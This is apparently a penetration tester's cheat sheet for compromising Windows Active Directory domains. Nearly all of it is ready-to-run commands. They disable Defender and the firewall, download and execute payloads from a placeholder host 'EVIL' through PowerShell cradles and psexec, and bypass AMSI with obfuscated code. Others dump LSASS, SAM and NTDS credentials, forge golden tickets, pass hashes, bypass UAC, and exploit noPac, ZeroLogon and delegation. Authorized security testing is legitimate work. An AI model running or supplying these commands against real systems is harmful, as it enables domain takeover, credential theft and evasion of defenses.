## PowerShell

* 32-bit PowerShell
   * `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
* 64-bit PowerShell
   * `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
* Avoid truncation
   * `<do_something> | Out-String -Width 10000`
* Check .NET version
   * `[environment]::version`
   * Then check the build on: https://docs.microsoft.com/en-us/dotnet/framework/migration-guide/how-to-determine-which-versions-are-installed
   * `4.0.30319.42000 == .NET Framework 4.6 and later`
* Check PowerShell version
   * `$PSVersionTable.PSVersion`
* Create SMB Share
   * `New-SmbShare -Name MyShare -Path C:\Windows\Tasks -FullAccess Everyone`
* Defender
   * Status
      * `Get-MpComputerStatus`
   * Disable
      * `Set-MpPreference -DisableRealtimeMonitoring $true`
   * Exclusion
      * `Add-MpPreference -ExclusionPath C:\Windows\Tasks`
   * Remove Definitions
      * `cmd /c "C:\program files\windows defender\MpCmdRun.exe" -removedefinitions -all`
* Disable Firewall
   * `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`
* Domain
   * `$env:USERDNSDOMAIN`
   * `Get-WmiObject Win32_ComputerSystem`
* Encode
   * `$text = "(New-Object System.Net.WebClient).DownloadString('http://EVIL/run.txt') | IEX"`
   * `$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)`
   * `$EncodedText = [Convert]::ToBase64String($bytes)`
* Execute Cradles
   * `(New-Object System.Net.WebClient).DownloadString('http://EVIL/run.txt') | IEX`
   * `iwr -uri http://EVIL/run.txt -UseBasicParsing | IEX`
   * Optional TLS v1.2
      * `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`
* Execution Policy
   * `Set-ExecutionPolicy Unrestricted -Scope CurrentUser`
* Find recent files
   * `ls C:\Users\ -Recurse | Where-Object {$_.LastWriteTime -lt (Get-Date).AddDays(-10)}`
* Grep
   * `ls -Path C:\Users\* -Recurse -EA Silent | Select-String -Pattern password`
* LanguageList
   * `Set-WinUserLanguageList -LanguageList en-US`
* Local Admin
  * `Get-LocalGroupMember -Group "Administrators"`
* PowerShell history
   * `ls C:\Users -Force -Recurse -Filter ConsoleHost_history.txt -EA Silent | cat`


## PowerView

* Get the current user's domain
   * `Get-NetDomain [-Domain test.local]`
* Get info about the domain controller
   * `Get-NetDomainController [-Domain test.local]`
* Get info about the domain users
   * `Get-NetUser [-Domain test.local] [-Username testuser]`
* Get info about the domain groups
   * `Get-NetGroup [*admin*]`
* Get info about domain group membership
   * `Get-NetGroup -UserName testuser`
* Get info about the domain computers
   * `Get-NetComputer`
* Enumerates machines where current user has LA
   * `Find-LocalAdminAccess`
* Enumerates LAs on all machines
   * `Invoke-EnumerateLocalAdmin -Verbose`
* Enumerates DAs on all machines
   * `Find-DomainUserLocation`
* Find Shares
   * `Find-DomainShare -CheckShareAccess | ft -wrap | Out-File -Encoding ascii shares.txt`
* Find Files
   * `Find-InterestingDomainShareFile -Include @('*password*', '*wachtwoord*', '*unattend*', '*.config', '*.ini', '*.txt', '*login*', '*credentials*', '*creds*', '*.xml', '*.php', '*.java', '*.jsp', '*.cfg', '*.json', '*.yaml', '*.yml') | ForEach-Object { Select-String -Path $_.Path -Pattern "password", "wachtwoord", "pwd:", "pwd=" } | ft -wrap | Out-File -Encoding ascii files.txt`
   * `Find-InterestingDomainShareFile -Include @('*.kdb', '*.kdbx')`
* Check for Unconstrained Delegation
   * `Get-NetComputer -UnConstrained`
* Check for Constrained Delegation
   * `Get-DomainUser -TrustedToAuth`
   * `Get-DomainComputer -TrustedToAuth`
* Check ACLs
   * `Find-InterestingDomainAcl -ResolveGUIDs`


## ActiveDirectory Module

* Get the current user's domain
   * `Get-ADDomain [-Identity test.local]`
* Get info about the domain controller
   * `Get-ADDomainController [-Discover] [-DomainName test.local]`
* Get info about the domain users
   * `Get-ADUser -Filter * -Properties *`
   * `Get-ADUser -Server dc.test.local`
   * `Get-ADUser -Identity testuser`
* Get info about the domain groups
   * `Get-ADGroup -Filter * | select Name`
   * `Get-ADGroup -Filter 'Name -like "*admin*"' | select Name`
   * `Get-ADGroupMember -Identity "Domain Admins"`
* Get info about domain group membership
   * `Get-ADPrincipalGroupMembership -Identity testuser`
* Get info about the domain computers
   * `Get-ADComputer -Filter * | select Name`
   * `Get-ADComputer -Filter * -Properties *`
* Check for Unconstrained Delegation
   * `Get-ADComputer -Filter {TrustedForDelegation -eq $true}`
   * `Get-ADUser -Filter {TrustedForDelegation -eq $true}`
* Check for Constrained Delegation
   * `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`
* Check ACLs
   * `(Get-Acl 'AD:\CN=testuser,CN=Users,DC=test,DC=lab,DC=local').Access`


## Password Spray (external)

* MFASweep
   * `Invoke-MFASweep -Username <email> -Password <pass>`
* MSOLSpray
   * `Invoke-MSOLSpray -UserList users.txt -Password <pass>`
* SprayingToolkit
   * `python3 atomizer.py owa <domain> --recon`
   * `python3 atomizer.py owa <domain> <pass> users.txt`


## Password Spray (internal)

* AD Users
   * ADSI
      * `([adsisearcher]"objectCategory=User").Findall() | ForEach {$_.properties.samaccountname} | Sort | Out-File -Encoding ASCII users.txt`
   * BloodHound
      * `cat users.json | jq | grep samaccountname | cut -d '"' -f 4 | sort -u > users.txt`
   * Impacket
      * `GetADUsers.py <domain>/<user>:<pass> [-dc-ip <ip>]`
* Password Policy
   * Net Command
      * `net accounts /dom`
   * ActiveDirectory Module
      * `Get-ADDefaultDomainPasswordPolicy`
   * See CrackMapExec section
* Kerbrute
   * `kerbrute passwordspray -d <domain> users.txt <pass> [--dc <ip>]`
   * Don't forget to try: `--user-as-pass`
* PowerShell
   * `Invoke-DomainPasswordSpray -Password <pass> -Force -OutFile spray.txt`


## CrackMapExec (CME)

* Password Policy
  * `crackmapexec smb <ip> -d <domain> -u <user> -p <pass> --pass-pol`
* Password Spray
  * `crackmapexec [mssql|rdp|smb|winrm] <subnet>> -u <user> -p <pass> --continue-on-success`


## BloodHound

* Don't forget to check ALL domains!
* Csharp
   * `SharpHound.exe --CollectionMethod All --ExcludeDomainControllers --NoSaveCache`
* PowerShell
   * `Invoke-BloodHound -CollectionMethod All -ExcludeDCs -NoSaveCache`
* BOF
   * `sharphoundbof --CollectionMethod All --ExcludeDomainControllers --NoSaveCache`
* Python
   * `proxychains bloodhound-python -c all -u <user> -p <pass> -d <domain> -ns <nameserver> --dns-timeout 30 --dns-tcp`
* BOFHound
   * First gather data with ldapsearch: `ldapsearch (objectclass=*)`
   * `python3 -m pip install bofhound`
   * `bofhound -o /data/`
* ADExplorerSnapshot
   * First create a snapshot with ADExplorer
   * `git clone https://github.com/c3c/ADExplorerSnapshot.py.git`
   * `python3 -m pip install .`
   * `ADExplorerSnapshot.py test.dat`


## Cypher

* GUI/Graph Queries
   * Computers where users can RDP
      * `MATCH c=(C:Computer)-[r2:CanRDP]-(U:User) return c`
   * Everything related to backups
      * `MATCH (n) WHERE n.description =~ "(?i).*(acronis|avamar|backup|barracuda|cohesity|commvault|dpm|rubrik|spectrum|unitrends|veeam|veritas).*" RETURN n`
   * Logon sessions
      * `MATCH c=(C:Computer)-[r2:HasSession]-(U:User) return c`
* Console Queries
   * Use Chrome for accessing the Neo4j browser
      * http://localhost:7474/browser/
   * Get all AD descriptions
      * `MATCH (n) WHERE n.description IS NOT NULL RETURN n.name,n.description`


## Ldapdomaindump

* Kali
   * `ldapdomaindump -u '<domain>\<user>' -p '<pass>' <dc-ip>`


## ASReproast

* Don't forget to check ALL domains!
* Impacket
   * `GetNPUsers.py <domain>/<user>:<pass> -dc-ip <ip>`
* Rubeus
   * `Rubeus.exe asreproast /format:hashcat /outfile:asreproast.txt`


## Kerberoast

* Don't forget to check ALL domains!
* Impacket
   * `GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <ip> -request-user <username>`
* PowerShell
   * `Invoke-Kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty hash | Out-File -Encoding ascii kerberoast.txt`
* Rubeus
   * `Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt [/tgtdeleg]`


## LSASS Dump

* GUI
   * `Task Manager > Details > lsass.exe > Create dump file`
* ProcDump
   * `procdump.exe -accepteula -r -ma <lsass_pid> debug.dmp`
* RunDLL
   * `Get-Process lsass`
   * `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <pid> C:\Windows\Tasks\debug.dmp full`


## GPPPassword

* CLI
  * `findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml`
* Impacket
  * `Get-GPPPassword.py <domain>/<user>:<pass>@<target> -dc-ip <ip>`


## LSASS parsing

* Mimikatz
   * `.\mimikatz.exe "sekurlsa::minidump C:\Temp\debug.dmp" "sekurlsa::logonpasswords" "exit" > lsass.txt`
* Pypykatz
   * `pypykatz lsa minidump [-o lsass.txt] debug.dmp`


## Mimikatz

* Elevate privileges
   * `privilege::debug`
* Dump LSASS
   * `sekurlsa::logonpasswords`
* Dump SAM
   * `lsadump::sam`
* Golden Ticket
   * `kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<ntlm> /ptt`
* Pass-the-Hash
   * `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm> /run:"mstsc.exe /restrictedadmin"`
   * Some notes about passing the hash with mstsc.exe:
     * "Restricted Admin Mode" ensures that credentials are NOT stored in the LSASS memory on the remote server.
       * Value 0 = Enabled
       * Value 1 = Disabled
     * However, if this setting is enabled, you CAN log in with an NTLM hash.
     * This setting is not enabled by default on systems. So PTH doesn't work by default.
* Over-Pass-The-Hash
   * `sekurlsa::pth /user:Administrator /domain:. /ntlm:<ntlm> /run:powershell`
* PTT
   * `sekurlsa::tickets /export`
   * `kerberos::ptt <ticket.kirbi>`


## Rubeus

* Dump TGTs
   * `Rubeus.exe dump /service krbtgt [/luid:<logonid>]`
* PTT
   * `Rubeus.exe ptt <ticket.kirbi>`
* Request TGT
   * `Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<ntlm> /ptt`


## Kerberos and Authorization

* Kerberos is an authentication protocol, not authorization
   * Only validates who you are, not whether you should access a resource or not
* You will always get a TGS to access a service (e.g. cifs/SRV01)
   * It's up to SRV01 to check whether you should actually be able to
* Simplified Flow
   * User authenticates to domain controller (DC)
   * DC returns ticket granting ticket (TGT)
   * Authenticated user requests service ticket to particular service (SPN) by representing TGT to DC
   * DC returns service ticket (TGS)
   * User sends service ticket to target host
* Golden Ticket
   * Forging a TGT
   * Requires the krbtgt hash
   * Can be used to request any TGS from the DC
* Silver Ticket
   * Forging a TGS
   * Requires the machine account hash
   * Can be used to directly access any service (without touching the DC!)


## Delegation

* Delegation Explained
   * Kerberos "Double Hop" issue: user <> web server <> database
   * The intermediate server MUST be trusted for delegation
   * Otherwise, the intermediate server cannot perform any actions on the database on behalf of the user.
* Unconstrained Delegation
   * You have Admin privileges on machine X
   * The TGTs of all authenticated objects are saved in memory due to Unconstrained Delegation
   * With the "Printer Bug" you force a DC to authenticate to machine X
   * With the TGT of the DC you can DCSync
* Constrained Delegation
   * You have user privileges on machine X
   * The "msds-allowedToDelegateto" attribute on machine X is filled with machine Y
   * You can now impersonate ANY user on machine Y (including a DA, if it is not in the "Protected Users" group)
   * Log in and dump LSASS
   * Note that impersonation does not work in domain context!
* Resource Based Constrained Delegation
   * You have user privileges in a domain
   * This user has "GenericWrite" privileges on machine Y
   * You create a new AD object with this user: machine Z
   * You are abusing "GenericWrite" by populating the "msDS-AllowedToActOnBehalfOfOtherIdentity" attribute on machine Y with the new machine Z
   * You can now impersonate ANY user on machine Y (including a DA, if it is not in the "Protected Users" group)
   * Log in and dump LSASS
   * Note that impersonation does not work in domain context!
* Extra RBCD info
   * The frontend service (New-MachineAccount) can use S4U2Self to request the forwardable TGS for any user to itself followed by S4U2Proxy to create a TGS for that user to the backend service (Victim with GenericWrite).
   * The KDC checks if the SID of the frontend service is present in the msDS-AllowedToActOnBehalfOfOtherIdentity property of the backend service.


## Unconstrained Delegation Abuse

* Monitor host with Unconstrained Delegation
   * Open cmd as admin
   * `Rubeus.exe monitor /interval:5 /filteruser:DC01$`
* Then force authentication to your host, for example via Printerbug, Petitpotam, or Coercer.
* Pass-the-Ticket
   * `cat ticket.txt | tr -d '\n' | tr -d ' '`
   * `Rubeus.exe ptt /ticket:<ticket>`
* DCSync
   * `mimikatz.exe "lsadump::dcsync /domain:test.local /user:test\Administrator" "exit"`


## Constrained Delegation Abuse

* Request TGT for compromised service with Constrained Delegation
   * `Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<ntlm>`
* Invoke S4U extensions
   * `cat ticket.txt | tr -d '\n' | tr -d ' '`
   * `Rubeus.exe s4u /ticket:<ticket> /impersonateuser:Administrator /msdsspn:<spn> [/altservice:<spn>] /ptt`


## Resource-Based Constrained Delegation Abuse (RBCD)

* Create new machine account (with PowerMad)
   * Option 1 - `PowerMad: New-MachineAccount -MachineAccount <computername> -Password $(ConvertTo-SecureString '<pass>' -AsPlainText -Force)`
   * Option 2 - `SharpMad: Sharpmad.exe MAQ -Action new -MachineAccount <computername> -MachinePassword <pass>`
* Create SecurityDescriptor
   * `$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid`
   * `$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"`
* Convert SecurityDescriptor
   * `$SDbytes = New-Object byte[] ($SD.BinaryLength)`
   * `$SD.GetBinaryForm($SDbytes,0)`
* Set msds-allowedtoactonbehalfofotheridentity on target where we have GenericWrite privileges (with PowerView)
   * `Get-DomainComputer -Identity <target> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}`
* Use S4U to request a TGS
   * `Rubeus.exe s4u /user:myComputer$ /rc4:<ntlm> /impersonateuser:administrator /msdsspn:CIFS/<target> /ptt`
* Verify access
   * `ls \\<target>\c$`


## Impacket RBCD

* Add Computer
   * `addcomputer.py -computer-name 'rbcd$' -computer-pass 'Password12345' -hashes <ntlm_of_owned_computer$> -dc-ip <ip> 'fqdn/owned_computer$'`
* Set attribute
   * `rbcd.py -delegate-to '<target_computer$>' -delegate-from 'rbcd$' -action write -hashes <ntlm_of_owned_computer$> -dc-ip <ip> '<fqdn/owned_computer$>'`
* Get TGT
   * `getST.py -spn CIFS/<target.fqdn> -impersonate 'Administrator' -dc-ip <ip> '<fqdn>/rbcd$:Password12345'`
* Set environment
   * `export KRB5CCNAME=/home/kali/Administrator.ccache`
* SecretsDump
   * `secretsdump.py -k -no-pass <fqdn>/Administrator@<target_computer$>`


## Domain Admin to Enterprise Admin

* Obtain krbtgt hash
   * `lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt`
   * `cce9d6cd94eb31ccfbb7cc8eeadf7ce1`
* Find domain SIDs
   * `Get-DomainSID -Domain prod.corp1.com`
   * `S-1-5-21-634106289-3621871093-708134407`
   * `Get-DomainSID -Domain corp1.com`
   * `S-1-5-21-1587569303-1110564223-1586047116`
* Craft golden ticket with ExtraSid
   * `kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /krbtgt:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /ptt`
* Verify access
   * `psexec.exe \\rdc01 cmd`


## DCSync

* Ntdsutil
   * `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\Windows\Tasks\' q q"`
   * `Compress-Archive -Path C:\Windows\Tasks\* -DestinationPath C:\Windows\Tasks\debug.zip`
* Shadow Copy
  * `vssadmin.exe create shadow /for=C:`
  * `cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Tasks\`
  * `cmd /c copy  \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Tasks\`
  * `cmd /c copy  \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Windows\Tasks\`
  * `Compress-Archive -Path C:\Windows\Tasks\* -DestinationPath C:\Windows\Tasks\debug.zip`
* SecretsDump
   * `secretsdump.py <domain>/<user>:<pass>@<target> -outputfile dump`
   * `secretsdump.exe <domain>/<user>:<pass>@<target> -outputfile dump`


## SecretsDump (local)

* Local NTDS
   * `secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit -outputfile dump LOCAL`
* Local SAM
   * Download local passwords
      * `reg save HKLM\SAM C:\Windows\Tasks\SAM`
   * Download decryption key
      * `reg save HKLM\SYSTEM C:\Windows\Tasks\SYSTEM`
   * Download cached domain credentials
      * `reg save HKLM\SECURITY C:\Windows\Tasks\SECURITY`
   * Run Impacket locally
      * `secretsdump.py -system SYSTEM -security SECURITY -sam SAM -outputfile dump LOCAL`


## Pass-the-Hash (PTH)

* Impacket
   * `psexec.py <domain>/<user>:<pass>@<target> -hashes <ntlm>:<ntlm> powershell`
* Invoke-TheHash
   * Check reuse
      * `Invoke-TheHash -Type WMIExec -Target <ip_subnet> -Username Administrator -Hash <ntlm>`
   * Run command
      * `Invoke-TheHash -Type SMBExec -Target <ip> -Username Administrator -Hash <ntlm> -Command 'whoami'`


## PsExec

* Remote target
   * `psexec.exe -accepteula \\<target> powershell`
   * `psexec.exe -accepteula \\<target> "cmd.exe" "/c powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://EVIL/run.txt'))"`
* SYSTEM
   * `psexec.exe -accepteula -i -s powershell`
* Task Manager
   * `iwr -uri https://live.sysinternals.com/PsExec64.exe -OutFile C:\Windows\Tasks\psexec.exe`
   * `.\psexec.exe -accepteula -sid taskmgr.exe`


## Kerberos on Linux

* Install Kerberos client utilities
   * `sudo apt install krb5-user`
* Set the ticket for impacket use
   * `export KRB5CCNAME=/tmp/ticket.ccache`
* Example: Get AD Users
   * `proxychains GetADUsers.py -k -no-pass -dc-ip <dc-ip> <domain>/<user>`
      * -no-pass = Don't ask for password (useful for -k)
      * -k = Use Kerberos authentication.


## Responder

* [Responder](https://github.com/lgandx/Responder)
   * `responder -I eth0 -wd`
   * -w = Start the WPAD rogue proxy server.
   * -d = Enable answers for DHCP broadcast requests.
* [InveighZero](https://github.com/Kevin-Robertson/InveighZero)
   * `Inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]`
* [Inveigh](https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1)
   * `Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y [-Elevated N]`


## Mitm6

* Screen 1
  * `mitm6 -d <domain>`
* Screen 2
  * `ntlmrelayx.py -6 -t ldaps://<domain> -wh attacker-wpad`
* Filter all usernames
  * `cat domain_users.grep | awk -F '\t' '{print $3}' | sort -u > users.txt`


## Chisel

* Install
   * `apt install golang`
   * `git clone https://github.com/jpillora/chisel.git`
   * `cd chisel`
* Reverse Port Forward
   * Server
      * `go build`
      * `chisel server -p 443 --reverse`
   * Client
      * `GOOS=windows go build`
      * `chisel.exe client <ip>:443 R:1433:127.0.0.1:1433`
   * Check
      * `nmap -p 1433 localhost`
* SOCKS5
   * Server
      * `./chisel server -p 80 --reverse --socks5`
   * Client
      * `.\chisel.exe client <ip>:80 R:socks`
   * Check
      * `proxychains nmap -p 1433 localhost`


AMSI Bypasses
Most public AMSI bypass techniques have in common that they either disable Powershell Script-Logging or change subvalues of the System.Management.Automation namespace. Both techniques are therefore Powershell specific and only affect the Anti Malware Scan-Interface for Powershell script-code. This means that reflectively loaded .NET binaries WILL be flagged.


Remember that amsi.dll is loaded into a new process to hook any input in the Powershell command line or to analyze content for [System.Reflection.Assembly]::Load() calls. More successful AMSI bypass techniques rely on in memory patching for amsi.dll, which breaks AMSI for the whole process. This means that reflectively loaded .NET binaries will NOT be flagged.


    [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)


## AppLocker

* Get Policy
   * `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
* Bypass
   * `C:\Windows\Tasks\`
   * `rundll32`
   * `https://lolbas-project.github.io/`


## Constrained Language Mode (CLM)

* Check LanguageMode
   * `$ExecutionContext.SessionState.LanguageMode`
   * `ConstrainedLanguage`
* PowerShell Downgrade
   * `powershell -v 2`
* [Bypass](https://github.com/calebstewart/bypass-clm)
* [Custom Runspaces](https://github.com/mgeeky/Stracciatella)
* [PowerShdll](https://github.com/p3nt4/PowerShdll)
   * `rundll32.exe PowerShdll.dll,main`
* [MSBuild](https://github.com/Cn33liz/MSBuildShell)
   * `C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\Windows\Tasks\MSBuildShell.csproj`


## UAC Bypass (C#)

* https://github.com/FatRodzianko/SharpBypassUAC
* Generate EncodedCommand
   * `echo -n 'cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update' | base64`
* Use SharpBypassUAC e.g. from a CobaltStrike beacon
   * `execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ==`
* Check
   * `whoami /groups`
   * `Mandatory Label\High Mandatory Level`


## UAC Bypass (CMSTP)

* https://github.com/expl0itabl3/uac-bypass-cmstp
* Compile Source.cs
   * `Add-Type -TypeDefinition ([IO.File]::ReadAllText("C:\Windows\Tasks\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "C:\Windows\Tasks\test.dll"`
* Load DLL
   * `[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\Windows\Tasks\test.dll"))`
* Execute elevated command
   * `[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe")`
* Check
   * `whoami /groups`
   * `Mandatory Label\High Mandatory Level`


## UAC Bypass (Fodhelper)

* Check
   * `whoami /groups`
   * `Mandatory Label\Medium Mandatory Level`
* Exploit
   * `New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell -Force`
   * `New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force`
   * `C:\Windows\System32\fodhelper.exe`
* Check
   * `whoami /groups`
   * `Mandatory Label\High Mandatory Level`


## Lateral - RDP (port 3389)

* Rdesktop
  * `rdesktop -d <domain> -u <user> -p <pass> <target>`
* Xfreerdp
  * `xfreerdp /d:<domain> /u:<user> /p:<pass> /v:<target> /cert-ignore /dynamic-resolution`
  * `xfreerdp /d:<domain> /u:<user> /pth:<hash> /v:<target> /cert-ignore /dynamic-resolution`
  * Optional shared drive: `/drive:home,/home/kali/temp/`
* Enable PTH
   * `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`
* Enable Remote Desktop connections
   * `Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0`
* Enable Network Level Authentication (NLA)
   * `Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1`
* Enable Windows firewall rules to allow incoming RDP
   * `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
* Non-admin users
   * `Add-LocalGroupMember -Group "Remote Desktop Users" -Member <user>`


## Lateral - WinRM (port 5985)

* Enable PowerShell Remoting on the target (box needs to be compromised first)
   * `Enable-PSRemoting -force`
* Check if a given system is listening on WinRM port
   * `Test-NetConnection <IP> -CommonTCPPort WINRM`
* Trust all hosts
   * `Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force`
* Check what hosts are trusted
   * `Get-Item WSMan:\localhost\Client\TrustedHosts`
* Execute command on remote host
   * `Invoke-Command <host> -Credential $cred -ScriptBlock {Hostname}`
* Interactive session with explicit credentials
   * `Enter-PSSession <host> -Credential <domain>\<user>`
* Interactive session using Kerberos:
   * `Enter-PSSession <host> -Authentication Kerberos`
* Upload file to remote session
   * `Copy-Item -Path C:\Windows\Tasks\PowerView.ps1 -Destination C:\Windows\Tasks\ -ToSession (Get-PSSession)`
* Download file from remote session
   * `Copy-Item -Path C:\Users\Administrator\Desktop\test.txt -Destination C:\Windows\Tasks\ -FromSession (Get-PSSession)`


## PowerUpSQL

* Get Local Instance
   * `Get-SQLInstanceLocal`
* Query Local Instance
   * `Get-SQLQuery -Instance <local_instance> -Query "Select @@version"`
* Execute Command on Local Instance
   * `Invoke-SQLOSCmd -Instance "<local_instance>" -Command "whoami"`
* Audit
   * `Invoke-SQLAudit -Instance <instance>`
* Get Linked Instances
   * `Get-SQLServerLink -Instance "<local_instance>"`
* Crawl Linked Instances
   * `Get-SQLServerLinkCrawl -Instance "<local_instance>"`
* Query Linked Instance
```
Get-SQLQuery -Query "SELECT * FROM OPENQUERY(`"<remote_instance>`", 'select @@servername');"
```
* Enable xp_cmdshell on Linked Instance
   * `Get-SQLQuery -Query "EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [<remote_instance>] EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [<remote_instance>]"`
* Execute Command on Linked Instance
   * `Get-SQLServerLinkCrawl -Instance "<remote_instance>" -Query "exec master..xp_cmdshell 'whoami'"`
* Get Shell on Linked Instance
   * `Get-SQLServerLinkCrawl -Instance "RDC01\SQLEXPRESS" -Query "exec master..xp_cmdshell 'powershell -enc bla'"`
* xp_dirtree
   * `Get-SQLQuery -Instance <instance> -Query "EXEC master..xp_dirtree '\\<ip>\<share>';"`


## Runas

* Start process (domain context)
   * `runas /netonly /user:<user> powershell`
* Start process (local context)
   * `runas /user:<user> powershell`
* Use saved credentials
   * `runas /savecred /user:administrator powershell`


## Nltest

* Get Domain Controllers
   * `nltest /dsgetdc:<domain>`
* Get Domain Trusts
   * `nltest /trusted_domains`


## Copy-Paste

* Linux
   * `apt install xclip`
   * `base64 BloodHound.zip | tr -d '\n' | xclip -sel clip`
* Macos
   * `do_something | pbcopy`
* Windows
   * `certutil -encode BloodHound.zip BloodHound.b64`
   * `cat BloodHound.b64 | Set-Clipboard`
   * `certutil -decode BloodHound.b64 BloodHound.zip`


## Verify Hashes

* Linux
   * `sha256sum <file>`
* MacOS
   * `shasum -a 256 <file>`
* OpenSSL
   * `openssl dgst -sha256 <file>`
* Windows
   * `Get-FileHash <file>`


## Hashcat

* Remove machine accounts
   * `grep -F -v '$' dump.ntds.full > dump.ntds`
* Cracking
   * `hashcat -m 1000 dump.ntds mystery-list.txt -r OneRuleToRuleThemAll.rule`
* LM incremental
   * `hashcat -m 3000 dump.ntds -a 3 '?a?a?a?a?a?a?a' -i`
* NTLM incremental
   * `hashcat -m 1000 dump.ntds -a 3 '?a?a?a?a?a?a?a?a' -i`


## Load C# assembly reflectively

* Ensure that the referenced class and main methods are public before running this!

```
$data = (New-Object System.Net.WebClient).DownloadData('http://EVIL/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("dump".Split())
```


## PrivExchange

* https://github.com/Ridter/Exchange2domain
* Patched as of Feburary 12th, 2019


## ZeroLogon

* Check
  * `crackmapexec smb <ip> -d <domain> -u <user> -p <pass> -M zerologon`
  * `lsadump::zerologon /target:<dc_fqdn> /account:<dc01$>`
* Exploit
  * https://github.com/dirkjanm/CVE-2020-1472
  * https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon
  * Or use Mimikatz (lsadump::zerologon)
* Patched as of August 11th, 2020


## HiveNightmare / SeriousSAM

* https://github.com/GossiTheDog/HiveNightmare
* Patched as of August 10th, 2021


## PrintNightmare

* Check
  * `rpcdump.py @<ip> | egrep 'MS-RPRN|MS-PAR'`
  * `REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"`
* Exploit
   * https://github.com/cube0x0/CVE-2021-1675
   * https://github.com/calebstewart/CVE-2021-1675
   * https://github.com/outflanknl/PrintNightmare
   * Or use Mimikatz (misc::printnightmare)
* Patched as of September 15th, 2021


## samAccountName spoofing / noPac

* https://github.com/cube0x0/noPac
* Requirements
   * 1 DC not patched with either KB5008380 or KB5008602
   * Any valid domain user account
   * Machine Account Quota (MAQ) above 0 (by default it is 10)
* Check
   * `noPac.exe scan -domain <domain> -user <user> -pass <pass>`
* Exploit
    * https://github.com/cube0x0/noPac
     * `noPac.exe -domain <domain> -user <user> -pass <pass> /dc <dc_fqdn> /mAccount demo123 /mPassword Password123! /service cifs /ptt`
     * `noPac.exe -domain <domain> -user <user> -pass <pass> /dc <dc_fqdn> /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator`
   * https://github.com/Ridter/noPac
* Patched as of November 9th, 2021


## Coercer

* https://github.com/p0dalirius/Coercer
* `sudo python3 -m pip install coercer`
* `Coercer coerce -l <attacker> -t <dc> -d <domain> -u <user> -p <pass>`


## PetitPotam

* https://github.com/topotam/PetitPotam
* `PetitPotam.py -d <domain> -u <user> -p <pass> <attacker> <dc>`
* The unauthenticated variant is fixed as of Aug 10, 2021. The authenticated variant won't be fixed.


## PrinterBug

